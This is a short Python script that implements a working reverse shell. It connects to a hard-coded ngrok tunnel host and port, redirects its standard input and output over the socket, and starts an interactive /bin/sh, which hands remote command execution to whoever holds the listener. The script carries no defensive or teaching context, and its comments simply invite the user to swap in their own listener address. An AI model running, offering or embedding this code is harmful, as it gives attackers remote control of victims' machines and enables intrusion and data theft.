#!/usr/bin/env python3

import socket
import subprocess
import os
import sys

def reverse_shell(host, port):
    """
    Simple reverse shell that connects back to a listener
    """
    try:
        # Create socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the handler
        s.connect((host, port))
        
        # Duplicate file descriptors for stdin, stdout, stderr
        os.dup2(s.fileno(), 0)  # stdin
        os.dup2(s.fileno(), 1)  # stdout  
        os.dup2(s.fileno(), 2)  # stderr
        
        # Execute shell
        subprocess.call(["/bin/sh", "-i"])
        
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Configuration
    LHOST = "6.tcp.eu.ngrok.io"  # Change to your listener IP
    LPORT = 11378         # Change to your listener port
    
    reverse_shell(LHOST, LPORT)
